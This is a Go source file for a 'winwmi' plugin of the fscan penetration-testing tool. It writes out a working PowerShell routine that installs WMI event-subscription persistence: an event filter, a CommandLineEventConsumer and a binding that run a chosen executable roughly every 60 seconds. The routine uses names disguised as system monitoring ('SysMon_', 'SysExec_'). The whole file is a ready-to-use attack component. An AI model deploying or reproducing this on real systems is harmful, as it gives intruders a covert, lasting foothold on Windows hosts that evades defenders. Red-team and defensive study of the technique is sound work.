//go:build (plugin_winwmi || !plugin_selective) && windows && !no_local

package local

import (
	"context"
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"

	"github.com/shadow1ng/fscan/common"
	"github.com/shadow1ng/fscan/common/i18n"
	"github.com/shadow1ng/fscan/plugins"
)

type WinWMIPlugin struct {
	plugins.BasePlugin
}

func NewWinWMIPlugin() *WinWMIPlugin {
	return &WinWMIPlugin{
		BasePlugin: plugins.NewBasePlugin("winwmi"),
	}
}

func (p *WinWMIPlugin) Scan(ctx context.Context, info *common.HostInfo, session *common.ScanSession) *plugins.Result {
	pePath := session.Config.WinPEFile
	if pePath == "" {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.GetText("local_pe_not_specified"))}
	}
	if _, err := os.Stat(pePath); err != nil {
		return &plugins.Result{Success: false, Error: 		fmt.Errorf("%s", i18n.Tr("local_pe_not_found", pePath))}
	}

	absPath, _ := filepath.Abs(pePath)
	baseName := strings.TrimSuffix(filepath.Base(absPath), filepath.Ext(absPath))

	filterName := fmt.Sprintf("SysMon_%s", baseName)
	consumerName := fmt.Sprintf("SysExec_%s", baseName)

	ps := fmt.Sprintf(`$ok = 0
try {
  $f = ([wmiclass]"\\.\root\subscription:__EventFilter").CreateInstance()
  $f.Name = "%s"; $f.EventNameSpace = "root\cimv2"; $f.QueryLanguage = "WQL"
  $f.Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  $f.Put() | Out-Null; $ok++; Write-Output "[OK] EventFilter"
} catch { Write-Output "[FAIL] EventFilter: $_" }
try {
  $c = ([wmiclass]"\\.\root\subscription:CommandLineEventConsumer").CreateInstance()
  $c.Name = "%s"; $c.ExecutablePath = "%s"; $c.CommandLineTemplate = "%s"
  $c.Put() | Out-Null; $ok++; Write-Output "[OK] Consumer"
} catch { Write-Output "[FAIL] Consumer: $_" }
try {
  $fi = Get-WmiObject -Namespace root\subscription -Class __EventFilter -Filter "Name='%s'"
  $co = Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -Filter "Name='%s'"
  $b = ([wmiclass]"\\.\root\subscription:__FilterToConsumerBinding").CreateInstance()
  $b.Filter = $fi.__PATH; $b.Consumer = $co.__PATH
  $b.Put() | Out-Null; $ok++; Write-Output "[OK] Binding"
} catch { Write-Output "[FAIL] Binding: $_" }
Write-Output "TOTAL:$ok"`,
		filterName, consumerName, absPath, absPath, filterName, consumerName)

	out, err := exec.Command("powershell", "-NoProfile", "-Command", ps).CombinedOutput()
	if err != nil {
		common.LogError(i18n.Tr("error_generic", fmt.Errorf("PowerShell执行失败: %w, 输出: %s", err, strings.TrimSpace(string(out)))))
	}
	result := string(out)

	var output strings.Builder
	successCount := 0
	for _, line := range strings.Split(result, "\n") {
		line = strings.TrimSpace(line)
		if strings.HasPrefix(line, "[OK]") || strings.HasPrefix(line, "[FAIL]") {
			output.WriteString(line + "\n")
		}
		if strings.HasPrefix(line, "[OK]") {
			successCount++
		}
	}

	if successCount > 0 {
		common.LogSuccess(i18n.Tr("winwmi_success", successCount))
	}

	return &plugins.Result{
		Success: successCount > 0,
		Type:    plugins.ResultTypeService,
		Output:  output.String(),
	}
}

func init() {
	RegisterLocalPlugin("winwmi", func() Plugin {
		return NewWinWMIPlugin()
	})
}
